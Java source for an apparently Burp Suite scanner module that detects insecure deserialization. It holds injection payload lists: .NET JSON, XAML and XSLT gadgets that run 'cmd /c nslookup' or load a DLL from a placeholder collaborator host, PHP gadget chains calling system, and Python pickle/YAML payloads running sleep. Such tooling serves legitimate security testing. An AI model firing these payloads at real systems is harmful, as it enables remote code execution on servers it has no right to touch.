package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.Interaction;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.omnistrike.framework.CollaboratorManager;
import com.omnistrike.framework.DeduplicationStore;
import com.omnistrike.framework.FindingsStore;

import com.omnistrike.model.*;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * MODULE 11: Insecure Deserialization Scanner
 * Detects insecure deserialization across Java, .NET, PHP, and Python.
 * Combines passive detection of serialized data with active gadget-chain testing
 * and OOB confirmation via Burp Collaborator.
 */
public class DeserializationScanner implements ScanModule {

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;
    private CollaboratorManager collaboratorManager;

    private final ConcurrentHashMap<String, Boolean> tested = new ConcurrentHashMap<>();

    // ==================== PASSIVE DETECTION PATTERNS ====================

    // Java serialization indicators
    private static final Pattern JAVA_MAGIC_BYTES_B64 = Pattern.compile("rO0AB[A-Za-z0-9+/=]");
    private static final Pattern JAVA_MAGIC_BYTES_HEX = Pattern.compile("(?i)ac\\s*ed\\s*00\\s*05");
    private static final Pattern JAVA_CONTENT_TYPE = Pattern.compile(
            "(?i)application/x-java-serialized-object|application/x-java-object");
    private static final Pattern JAVA_RMI_PATTERN = Pattern.compile("(?i)\\bjrmp\\b|\\brmi\\b");
    private static final Set<String> JAVA_VULN_LIBRARIES = Set.of(
            "commons-collections", "commons-beanutils", "spring-core", "spring-beans",
            "hibernate-core", "c3p0", "rome", "jboss", "jndi", "groovy",
            "bsh", "clojure", "scala", "mozilla-rhino", "myfaces", "vaadin",
            "xalan", "ognl", "log4j", "jackson-databind", "fastjson", "xstream",
            "snakeyaml", "kryo", "hessian", "dubbo", "shiro", "struts",
            "weblogic", "jenkins", "bamboo", "jira"
    );
    private static final Pattern SHIRO_REMEMBER_ME = Pattern.compile("(?i)rememberMe=([A-Za-z0-9+/=]+)");

    // .NET serialization indicators — passive detection
    private static final Pattern DOTNET_VIEWSTATE = Pattern.compile("__VIEWSTATE[^\"]*\"([^\"]+)\"");
    private static final Pattern DOTNET_VIEWSTATE_GENERATOR = Pattern.compile("__VIEWSTATEGENERATOR[^\"]*\"([^\"]+)\"");
    private static final Pattern DOTNET_EVENT_VALIDATION = Pattern.compile("__EVENTVALIDATION[^\"]*\"([^\"]+)\"");
    private static final Pattern DOTNET_BINARY_FORMATTER = Pattern.compile(
            "(?i)BinaryFormatter|SoapFormatter|LosFormatter|ObjectStateFormatter|NetDataContractSerializer");
    private static final Pattern DOTNET_SERIALIZER_EXTENDED = Pattern.compile(
            "(?i)XmlSerializer|DataContractSerializer|DataContractJsonSerializer"
                    + "|JavaScriptSerializer|JsonConvert\\.DeserializeObject");
    private static final Pattern DOTNET_TYPE_NAME_HANDLING = Pattern.compile(
            "(?i)TypeNameHandling\\s*[=:]\\s*(All|Auto|Objects|Arrays)");
    private static final Pattern DOTNET_VIEWSTATE_NO_MAC = Pattern.compile(
            "(?i)enableViewStateMac\\s*=\\s*[\"']?false");
    private static final Pattern DOTNET_REMOTING = Pattern.compile(
            "(?i)\\.rem(?:\\?|\\s|$)|\\.soap(?:\\?|\\s|$)|RemotingConfiguration|TcpChannel|HttpChannel");
    private static final Pattern DOTNET_ASMX_WCF = Pattern.compile(
            "(?i)\\.asmx|\\.svc|<wsdl:|BasicHttpBinding|WSHttpBinding|NetTcpBinding");
    private static final Pattern DOTNET_SESSION_COOKIE = Pattern.compile(
            "(?i)\\.AspNet\\.Cookies|\\.AspNetCore\\.Session|ASP\\.NET_SessionId|FedAuth|WSFedAuth");
    // .NET BinaryFormatter magic bytes: 00 01 00 00 00 FF FF FF FF in Base64
    private static final Pattern DOTNET_BINARY_B64 = Pattern.compile("AAEAAAD/////");
    // SOAP envelope indicating .NET SOAP deserialization
    private static final Pattern DOTNET_SOAP_ENVELOPE = Pattern.compile(
            "(?i)<soap:Envelope|<SOAP-ENV:Envelope");
    // $type property in JSON (JSON.NET polymorphic deserialization)
    private static final Pattern DOTNET_DOLLAR_TYPE = Pattern.compile(
            "\"\\$type\"\\s*:\\s*\"[^\"]+\"");

    // PHP serialization indicators
    private static final Pattern PHP_SERIALIZED = Pattern.compile("(?:[OaCis]):\\d+:");
    private static final Pattern PHP_PHAR = Pattern.compile("(?i)phar://");
    private static final Pattern PHP_SERIALIZED_FULL = Pattern.compile(
            "(?:[OaCis]):\\d+:(?:\\{|\"[^\"]*\")");

    // Python serialization indicators
    private static final Pattern PYTHON_PICKLE_B64 = Pattern.compile("gASV[A-Za-z0-9+/=]"); // pickle protocol 4
    private static final Pattern PYTHON_PICKLE_V2 = Pattern.compile("gAI[A-Za-z0-9+/=]"); // Base64 of pickle v2 header (0x80 0x02)
    private static final Pattern PYTHON_YAML_UNSAFE = Pattern.compile(
            "(?i)yaml\\.load\\(|yaml\\.unsafe_load|!!python/object");
    private static final Pattern PYTHON_MARSHAL = Pattern.compile("(?i)marshal\\.loads");

    // Known serialization headers
    private static final Set<String> SERIALIZATION_CONTENT_TYPES = Set.of(
            "application/x-java-serialized-object",
            "application/x-java-object",
            "application/x-www-form-urlencoded", // ViewState often here
            "application/octet-stream"
    );

    // Cookie/header names that often contain serialized data
    private static final Set<String> SUSPECT_COOKIE_NAMES = Set.of(
            "rememberme", "remember-me", "jsessionid", "session", "token",
            "viewstate", "__viewstate", "laravel_session", "ci_session",
            "symfony", "phpsessid", "csrf_cookie", "user_data",
            // .NET specific
            ".aspnet.cookies", ".aspnetcore.session", "asp.net_sessionid",
            "fedauth", "wsfedauth", "__requestverificationtoken",
            ".aspxauth", "aspnet.applicationcookie",
            // Additional suspect cookie names
            "__session", "data", "state", "object", "payload", "s",
            "flask_session", "connect.sid", "express.sid", "koa.sess",
            "koa:sess", "play_session", "rack.session", "_rails_session",
            "sid", "ssid", "serialized"
    );

    // ==================== ACTIVE TESTING PAYLOADS ====================

    // Java gadget chain sleep payloads (Base64 encoded common chains)
    // These are marker strings — in a real deployment you'd use ysoserial output
    private static final String[][] JAVA_TIME_PAYLOADS = {
            {"CommonsCollections1", "rO0ABXNyADJvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXAAAAAAAAAAAQMAAUwAB2ZhY3RvcnlO"},
            {"CommonsCollections5", "rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u"},
            {"CommonsBeanutils1", "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQAAAAAAAAAAAQMAA"},
            {"CommonsCollections6", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAA"},
            {"CommonsCollections7", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaHRhYmxlE7sPJSFK5LgDAAJGAApsb2FkRmFjdG9y"},
            {"Spring1", "rO0ABXNyAC5vcmcuc3ByaW5nZnJhbWV3b3JrLmNvcmUuU2VyaWFsaXphYmxlVHlwZVdyYXBwZXI"},
            {"Hibernate1", "rO0ABXNyAC5vcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5BYnN0cmFjdENvbXBvbmVudA"},
            {"C3P0", "rO0ABXNyACRjb20ubWNoYW5nZS52Mi5jM3AwLmltcGwuUG9vbEJhY2tlZA"},
            {"JRMPClient", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldIpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAB"},
            {"Groovy1", "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQAAAAAAAAABAQMAAUI="},
            {"ROME", "rO0ABXNyAChjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5PYmplY3RCZWFu"},
            {"BeanShell1", "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpl"},
            {"Myfaces1", "rO0ABXNyADhvcmcuYXBhY2hlLm15ZmFjZXMudmlldy5mYWNlbGV0cy5lbC5WZWF"},
            {"Jdk7u21", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldIpEhZWWuLc0AwAAeHB3DAAAAL"},
            {"Vaadin1", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3Rv"},
            {"Click1", "rO0ABXNyAC5vcmcuYXBhY2hlLmNsaWNrLmNvbnRyb2wuQ29sdW1uJENvbHVtblNvcnQ="},
    };

    // .NET deserialization payloads — error/behavior-based detection
    private static final String[][] DOTNET_PAYLOADS = {
            // BinaryFormatter gadget chains (Base64 fragments that trigger deserialization errors)
            {"ObjectDataProvider", "AAEAAAD/////AQAAAAAAAAAEAQAAAA1TeXN0ZW0uU3RyaW5n"},
            {"TypeConfuseDelegate", "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0"},
            // ActivitySurrogateSelector chain (triggers via BinaryFormatter)
            {"ActivitySurrogateSelector", "AAEAAAD/////AQAAAAAAAAAEAQAAABxTeXN0ZW0uQ29sbGVjdGlvbnMuU29ydGVkTGlzdA=="},
            // WindowsIdentity chain (BinaryFormatter + ClaimsIdentity)
            {"WindowsIdentity", "AAEAAAD/////AQAAAAAAAAAEAQAAAB5NaWNyb3NvZnQuSWRlbnRpdHlNb2RlbC5DbGFpbXM="},
            // DataSet/DataTable gadget (XML-based deserialization)
            {"DataSet", "AAEAAAD/////AQAAAAAAAAAEAQAAAA9TeXN0ZW0uRGF0YS5EYXRhU2V0"},
            // PSObject chain (PowerShell)
            {"PSObject", "AAEAAAD/////AQAAAAAAAAAEAQAAABdTeXN0ZW0uTWFuYWdlbWVudC5BdXRv"},
            // ClaimsIdentity chain
            {"ClaimsIdentity", "AAEAAAD/////AQAAAAAAAAAEAQAAABpTeXN0ZW0uU2VjdXJpdHkuQ2xhaW1z"},
            // TextFormattingRunProperties (Exchange/SharePoint)
            {"TextFormattingRunProperties", "AAEAAAD/////AQAAAAAAAAAMAgAAAE1NaWNyb3NvZnQuUG93ZXJTaGVsbA=="},
            // SortedSet chain
            {"SortedSet", "AAEAAAD/////AQAAAAAAAAAEAQAAACNTY3N0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Tb3J0ZWRTZXQ="},
            // AxHostState (Windows Forms)
            {"AxHostState", "AAEAAAD/////AQAAAAAAAAAEAQAAABhTeXN0ZW0uV2luZG93cy5Gb3Jtcy5Be"},
            // SessionSecurityToken (IdentityModel)
            {"SessionSecurityToken", "AAEAAAD/////AQAAAAAAAAAEAQAAACdTeXN0ZW0uSWRlbnRpdHlNb2RlbC5Ub2tlbnMu"},
            // TypeConfuseDelegate alternative
            {"TypeConfuseDelegateAlt", "AAEAAAD/////AQAAAAAAAAAEAQAAAB5TeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9u"},
    };

    // .NET JSON payloads — for TypeNameHandling / $type attacks (JSON.NET / JavaScriptSerializer)
    private static final String[][] DOTNET_JSON_PAYLOADS = {
            // ObjectDataProvider via JSON.NET $type
            {"JSON.NET ObjectDataProvider",
                    "{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\","
                            + "\"MethodName\":\"Start\","
                            + "\"ObjectInstance\":{\"$type\":\"System.Diagnostics.Process, System\"}}"},
            // WindowsIdentity via JSON.NET
            {"JSON.NET WindowsIdentity",
                    "{\"$type\":\"System.Security.Principal.WindowsIdentity, mscorlib\","
                            + "\"System.Security.ClaimsIdentity.bootstrapContext\":\"PAYLOAD\"}"},
            // SessionViewStateHistoryItem
            {"JSON.NET SessionViewState",
                    "{\"$type\":\"System.Web.UI.MobileControls.SessionViewState+SessionViewStateHistoryItem, "
                            + "System.Web.Mobile\",\"s\":\"PAYLOAD\"}"},
            // RolePrincipal
            {"JSON.NET RolePrincipal",
                    "{\"$type\":\"System.Web.Security.RolePrincipal, System.Web\","
                            + "\"System.Security.ClaimsIdentity.bootstrapContext\":\"PAYLOAD\"}"},
            // ClaimsIdentity
            {"JSON.NET ClaimsIdentity",
                    "{\"$type\":\"System.Security.Claims.ClaimsIdentity, mscorlib\","
                            + "\"System.Security.ClaimsIdentity.bootstrapContext\":\"PAYLOAD\"}"},
            // TextFormattingRunProperties (used in Exchange/SharePoint exploits)
            {"JSON.NET TextFormattingRunProperties",
                    "{\"$type\":\"Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties, "
                            + "Microsoft.PowerShell.Editor\",\"ForegroundBrush\":\"PAYLOAD\"}"},
            // JavaScriptSerializer type resolver
            {"JavaScriptSerializer TypeResolver",
                    "{\"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\","
                            + "\"MethodName\":\"Start\","
                            + "\"ObjectInstance\":{\"__type\":\"System.Diagnostics.Process, System\"}}"},
            // JSON.NET Assembly.Load
            {"JSON.NET Assembly.Load",
                    "{\"$type\":\"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install\","
                            + "\"Path\":\"http://COLLAB_PLACEHOLDER/payload.dll\"}"},
            // JSON.NET XamlReader
            {"JSON.NET XamlReader",
                    "{\"$type\":\"System.Windows.Markup.XamlReader, PresentationFramework\","
                            + "\"ParseAsync\":\"<ResourceDictionary/>\"}"},
            // JSON.NET ExpandoObject
            {"JSON.NET ExpandoObject",
                    "{\"$type\":\"System.Dynamic.ExpandoObject, System.Core\","
                            + "\"test\":\"value\"}"},
            // JSON.NET Uri
            {"JSON.NET Uri",
                    "{\"$type\":\"System.Uri, System\","
                            + "\"AbsoluteUri\":\"http://COLLAB_PLACEHOLDER/uri\"}"},
            // JSON.NET FileInfo
            {"JSON.NET FileInfo",
                    "{\"$type\":\"System.IO.FileInfo, mscorlib\","
                            + "\"FileName\":\"C:\\\\Windows\\\\win.ini\"}"},
            // JSON.NET DirectoryInfo
            {"JSON.NET DirectoryInfo",
                    "{\"$type\":\"System.IO.DirectoryInfo, mscorlib\","
                            + "\"FullName\":\"C:\\\\\"}"},
            // JavaScriptSerializer DotNetNuke
            {"JavaScriptSerializer DotNetNuke",
                    "{\"__type\":\"DotNetNuke.Common.Utilities.FileSystemUtils\","
                            + "\"MethodName\":\"PullFile\"}"},
            // JSON.NET Control Gallery (LosFormatter)
            {"JSON.NET Control Gallery",
                    "{\"$type\":\"System.Web.UI.LosFormatter, System.Web\","
                            + "\"SerializeObject\":\"PAYLOAD\"}"},
    };

    // .NET XML/XAML deserialization payloads
    private static final String[][] DOTNET_XML_PAYLOADS = {
            // XamlReader.Load payload
            {"XamlReader.Load",
                    "<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" "
                            + "xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" "
                            + "xmlns:System=\"clr-namespace:System;assembly=mscorlib\" "
                            + "xmlns:Diag=\"clr-namespace:System.Diagnostics;assembly=system\">"
                            + "<ObjectDataProvider x:Key=\"\" ObjectType=\"{x:Type Diag:Process}\" MethodName=\"Start\">"
                            + "<ObjectDataProvider.MethodParameters>"
                            + "<System:String>cmd</System:String>"
                            + "<System:String>/c nslookup COLLAB_PLACEHOLDER</System:String>"
                            + "</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>"},
            // DataContractSerializer XXE
            {"DataContractSerializer XXE",
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://COLLAB_PLACEHOLDER/xxe\">]>"
                            + "<root>&xxe;</root>"},
            // XmlSerializer type injection
            {"XmlSerializer Type",
                    "<?xml version=\"1.0\"?><root xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
                            + "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" "
                            + "xsi:type=\"System.Diagnostics.Process\"/>"},
            // XAML Process Start (ObjectDataProvider direct)
            {"XAML Process Start",
                    "<ObjectDataProvider xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" "
                            + "xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" "
                            + "xmlns:d=\"clr-namespace:System.Diagnostics;assembly=system\" "
                            + "MethodName=\"Start\">"
                            + "<ObjectDataProvider.ObjectInstance>"
                            + "<d:Process><d:Process.StartInfo>"
                            + "<d:ProcessStartInfo FileName=\"cmd\" Arguments=\"/c nslookup COLLAB_PLACEHOLDER\"/>"
                            + "</d:Process.StartInfo></d:Process>"
                            + "</ObjectDataProvider.ObjectInstance></ObjectDataProvider>"},
            // NetDataContractSerializer
            {"NetDataContractSerializer",
                    "<?xml version=\"1.0\"?><root xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" "
                            + "xmlns:x=\"http://www.w3.org/2001/XMLSchema\" "
                            + "i:type=\"System.Diagnostics.Process\" "
                            + "xmlns:d=\"http://schemas.datacontract.org/2004/07/System.Diagnostics\"/>"},
            // XSLT ProcessStartInfo (msxsl:script)
            {"XSLT ProcessStartInfo",
                    "<?xml version=\"1.0\"?><xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" "
                            + "xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" "
                            + "xmlns:user=\"http://test.com\" version=\"1.0\">"
                            + "<msxsl:script language=\"CSharp\" implements-prefix=\"user\">"
                            + "<![CDATA[public string exec(){System.Diagnostics.Process.Start(\"nslookup\","
                            + "\"COLLAB_PLACEHOLDER\");return \"\";}]]></msxsl:script>"
                            + "<xsl:template match=\"/\"><xsl:value-of select=\"user:exec()\"/>"
                            + "</xsl:template></xsl:stylesheet>"},
            // SoapFormatter SSRF
            {"SoapFormatter SSRF",
                    "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
                            + "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\">"
                            + "<SOAP-ENV:Body>"
                            + "<a1:ServerWebRequest xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/System.Net/System\">"
                            + "<a1:ServerWebRequest.uri>http://COLLAB_PLACEHOLDER/soap</a1:ServerWebRequest.uri>"
                            + "</a1:ServerWebRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>"},
    };

    // PHP deserialization payloads
    private static final String[][] PHP_PAYLOADS = {
            {"Generic PHP object", "O:8:\"stdClass\":1:{s:4:\"test\";s:5:\"value\";}"},
            {"Laravel RCE chain", "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":1:{s:9:\"\\0*\\0event\";O:25:\"Illuminate\\Bus\\Dispatcher\":1:{s:16:\"\\0*\\0queueResolver\";s:6:\"system\";}}"},
            {"Symfony chain", "O:44:\"Symfony\\Component\\Process\\Pipes\\WindowsPipes\":1:{s:5:\"files\";a:1:{i:0;s:10:\"/etc/passwd\";}}"},
            {"WordPress PHPObject", "O:21:\"WP_Theme_JSON_Resolver\":1:{s:5:\"theme\";O:8:\"WP_Theme\":1:{s:8:\"template\";s:5:\"admin\";}}"},
            {"Magento chain", "O:38:\"Magento\\Framework\\Simplexml\\Element\":1:{s:4:\"data\";s:28:\"<?xml version=\"1.0\"?><x/>\";}}"},
            {"CakePHP chain", "O:27:\"Cake\\Core\\Plugin\\PluginApp\":1:{s:4:\"path\";s:11:\"/etc/passwd\";}"},
            {"Monolog RCE", "O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"\\0*\\0socket\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"\\0*\\0handler\";N;s:13:\"\\0*\\0bufferSize\";i:-1;s:9:\"\\0*\\0buffer\";a:1:{i:0;a:2:{i:0;s:2:\"id\";s:5:\"level\";i:100;}}s:8:\"\\0*\\0level\";N;s:14:\"\\0*\\0initialized\";b:1;s:14:\"\\0*\\0bufferLimit\";i:-1;s:13:\"\\0*\\0processors\";a:2:{i:0;s:7:\"current\";i:1;s:6:\"system\";}}}"},
            {"Yii2 RCE", "O:23:\"yii\\db\\BatchQueryResult\":1:{s:36:\"\\0yii\\db\\BatchQueryResult\\0_dataReader\";O:14:\"yii\\db\\Command\":1:{s:6:\"\\0*\\0_db\";O:13:\"yii\\db\\Schema\":0:{}}}"},
            {"Guzzle PSR7", "O:24:\"GuzzleHttp\\Psr7\\Response\":1:{s:6:\"stream\";O:33:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\\0GuzzleHttp\\Psr7\\FnStream\\0methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":1:{s:9:\"\\0*\\0stack\";a:0:{}}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":1:{s:9:\"\\0*\\0stack\";a:0:{}}i:1;s:7:\"resolve\";}}}"},
            {"Drupal RCE", "O:28:\"Drupal\\Core\\Entity\\Entity\":1:{s:12:\"\\0*\\0entityType\";s:4:\"node\";}"},
            {"PHPUnit mock", "O:32:\"PHPUnit\\Framework\\MockObject\\Mock\":1:{s:10:\"invocation\";O:32:\"PHPUnit\\Framework\\MockObject\\Rule\":1:{s:4:\"rule\";s:6:\"system\";}}"},
            {"Slim RCE", "O:18:\"Slim\\Http\\Response\":1:{s:4:\"body\";O:15:\"Slim\\Http\\Body\":1:{s:6:\"stream\";O:33:\"GuzzleHttp\\Psr7\\FnStream\":0:{}}}"},
            {"CodeIgniter4 RCE", "O:44:\"CodeIgniter\\Cache\\Handlers\\FileHandler\":1:{s:8:\"\\0*\\0path\";s:11:\"/etc/passwd\";}"},
            {"ThinkPHP RCE", "O:27:\"think\\process\\pipes\\Windows\":1:{s:34:\"\\0think\\process\\pipes\\Windows\\0files\";a:1:{i:0;O:17:\"think\\model\\Pivot\":0:{};}}"},
    };

    // Python pickle payloads
    private static final String[][] PYTHON_PAYLOADS = {
            {"Pickle exec", "gASVIAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAVzbGVlcJSFlFKULg=="},
            {"Pickle import", "Y29zCnN5c3RlbQooUydzbGVlcCA1Jwp0Ui4="},
            {"Pickle subprocess", "gASVLQAAAAAAAACMCnN1YnByb2Nlc3OUjAVjaGVja19vdXRwdXSUk5SMBXNsZWVwlIWUUpQu"},
            {"YAML unsafe load", "ISFweXRob24vb2JqZWN0L2FwcGx5Om9zLnN5c3RlbQotIHNsZWVwIDU="},
            {"Pickle os.popen", "gASVKQAAAAAAAACMAnBvc2l4lIwGc3lzdGVtlJOUjA5zbGVlcCA1IDI+L3SFlFKULg=="},
            {"Pickle subprocess.call", "gASVMwAAAAAAAACMCnN1YnByb2Nlc3OUjARjYWxslJOUXZQojAVzbGVlcJSMATWUZYWUUpQu"},
            {"Pickle builtins.eval", "gASVJAAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwNX19pbXBvcnRfXygpkZRSlC4="},
            {"YAML !!python/object", "ISFweXRob24vb2JqZWN0L25ldzpvcy5zeXN0ZW0gW3NsZWVwIDVd"},
            {"Pickle reduce tuple", "Y3Bvc2l4CnN5c3RlbQpwMAooUydzbGVlcCA1JwpwMQp0cDIKUnAzCi4="},
            {"Pickle2 os.system", "gAJjcG9zaXgKc3lzdGVtCnEAWAcAAABzbGVlcCA1cQGFcQJScQMu"},
            {"Jsonpickle RCE", "eyJweS9yZWR1Y2UiOiBbeyJweS9mdW5jdGlvbiI6ICJvcy5zeXN0ZW0ifSwgeyJweS90dXBsZSI6IFsic2xlZXAgNSJdfV19"},
            {"PyYAML RCE", "ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBzbGVlcCA1"},
    };

    public static class DeserPoint {
        public final String location; // cookie, header, param, body
        public final String name;
        public final String value;
        public final String language; // Java, .NET, PHP, Python
        public final String indicator; // what triggered detection

        public DeserPoint(String location, String name, String value, String language, String indicator) {
            this.location = location;
            this.name = name;
            this.value = value;
            this.language = language;
            this.indicator = indicator;
        }
    }

    @Override
    public String getId() { return "deser-scanner"; }

    @Override
    public String getName() { return "Deserialization Scanner"; }

    @Override
    public String getDescription() {
        return "Insecure deserialization detection for Java, .NET, PHP, and Python with passive analysis and active gadget-chain testing.";
    }

    @Override
    public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }

    @Override
    public boolean isPassive() { return false; }

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                 CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        this.collaboratorManager = collaboratorManager;
    }

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        List<Finding> findings = new ArrayList<>();
        HttpRequest request = requestResponse.request();
        HttpResponse response = requestResponse.response();
        String url = request.url();
        String urlPath = extractPath(url);

        // ==================== PASSIVE ANALYSIS ====================

        // Analyze request for serialized data
        List<DeserPoint> deserPoints = new ArrayList<>();
        passiveAnalyzeRequest(request, url, deserPoints, findings);

        // Analyze response for serialization indicators
        if (response != null) {
            passiveAnalyzeResponse(response, url, findings);
        }

        // ==================== ACTIVE TESTING ====================
        // Test each identified serialization point
        for (DeserPoint dp : deserPoints) {
            String dedupParam = dp.name + ":" + dp.language;
            if (!dedup.markIfNew("deser-scanner", urlPath, dedupParam)) continue;

            try {
                activeTest(requestResponse, dp);
            } catch (Exception e) {
                api.logging().logToError("Deser active test error: " + e.getMessage());
            }
        }

        return findings;
    }

    // ==================== PASSIVE: REQUEST ANALYSIS ====================

    private void passiveAnalyzeRequest(HttpRequest request, String url,
                                        List<DeserPoint> deserPoints, List<Finding> findings) {
        // Check cookies
        for (var param : request.parameters()) {
            if (param.type() == burp.api.montoya.http.message.params.HttpParameterType.COOKIE) {
                String name = param.name().toLowerCase();
                String value = param.value();

                // Apache Shiro rememberMe
                if (name.equals("rememberme") || name.equals("remember-me")) {
                    deserPoints.add(new DeserPoint("cookie", param.name(), value, "Java", "Shiro rememberMe cookie"));
                    findings.add(Finding.builder("deser-scanner",
                                    "Shiro rememberMe cookie detected",
                                    Severity.MEDIUM, Confidence.FIRM)
                            .url(url).parameter(param.name())
                            .evidence("Cookie: " + param.name() + "=" + value.substring(0, Math.min(50, value.length())) + "...")
                            .description("Apache Shiro rememberMe cookie found. This is a known deserialization target. "
                                    + "Vulnerable versions allow RCE via crafted serialized objects.")
                            .build());
                }

                // Java serialized in cookie
                if (JAVA_MAGIC_BYTES_B64.matcher(value).find()) {
                    deserPoints.add(new DeserPoint("cookie", param.name(), value, "Java", "Base64 Java serialized object"));
                    reportPassiveFinding(findings, url, param.name(), "Java serialized object in cookie",
                            "Java", "Base64-encoded Java serialized object (rO0AB prefix)");
                }

                // PHP serialized in cookie
                if (PHP_SERIALIZED.matcher(value).find()) {
                    deserPoints.add(new DeserPoint("cookie", param.name(), value, "PHP", "PHP serialized string"));
                    reportPassiveFinding(findings, url, param.name(), "PHP serialized data in cookie",
                            "PHP", "PHP serialized object pattern (O:N: / a:N:)");
                }

                // Python pickle in cookie
                if (PYTHON_PICKLE_B64.matcher(value).find()) {
                    deserPoints.add(new DeserPoint("cookie", param.name(), value, "Python", "Pickle object"));
                    reportPassiveFinding(findings, url, param.name(), "Python pickle in cookie",
                            "Python", "Base64-encoded pickle data (gASV prefix)");
                }

                // .NET BinaryFormatter in cookie (AAEAAAD///// prefix)
                if (DOTNET_BINARY_B64.matcher(value).find()) {
                    deserPoints.add(new DeserPoint("cookie", param.name(), value, ".NET", ".NET BinaryFormatter in cookie"));
                    reportPassiveFinding(findings, url, param.name(), ".NET BinaryFormatter data in cookie",
                            ".NET", "Base64-encoded .NET BinaryFormatter object (AAEAAAD///// prefix)");
                }

                // .NET session cookies (FedAuth, .AspNet.Cookies, etc.)
                if (DOTNET_SESSION_COOKIE.matcher(name).find()) {
                    deserPoints.add(new DeserPoint("cookie", param.name(), value, ".NET", ".NET session cookie"));
                    findings.add(Finding.builder("deser-scanner",
                                    ".NET session cookie detected: " + param.name(),
                                    Severity.LOW, Confidence.FIRM)
                            .url(url).parameter(param.name())
                            .evidence("Cookie: " + param.name() + " (length=" + value.length() + ")")
                            .description(".NET session/auth cookie found. If this cookie contains serialized data "
                                    + "(e.g., claims, tokens), it may be a deserialization target.")
                            .build());
                }
            }
        }

        // Check body parameters and POST body
        for (var param : request.parameters()) {
            if (param.type() == burp.api.montoya.http.message.params.HttpParameterType.BODY) {
                checkParamValue(param.name(), param.value(), "body_param", url, deserPoints, findings);
            }
            if (param.type() == burp.api.montoya.http.message.params.HttpParameterType.URL) {
                checkParamValue(param.name(), param.value(), "url_param", url, deserPoints, findings);
            }
        }

        // Check request headers
        for (var header : request.headers()) {
            String name = header.name().toLowerCase();
            String value = header.value();

            if (JAVA_MAGIC_BYTES_B64.matcher(value).find()) {
                deserPoints.add(new DeserPoint("header", header.name(), value, "Java", "Java serialized in header"));
                reportPassiveFinding(findings, url, header.name(), "Java serialized data in request header",
                        "Java", "Base64 Java serialization in header: " + header.name());
            }
        }

        // Check raw body for .NET ViewState
        try {
            String body = request.bodyToString();
            if (body != null) {
                Matcher vsm = DOTNET_VIEWSTATE.matcher(body);
                if (vsm.find()) {
                    String viewstate = vsm.group(1);
                    deserPoints.add(new DeserPoint("body", "__VIEWSTATE", viewstate, ".NET", "ViewState token"));
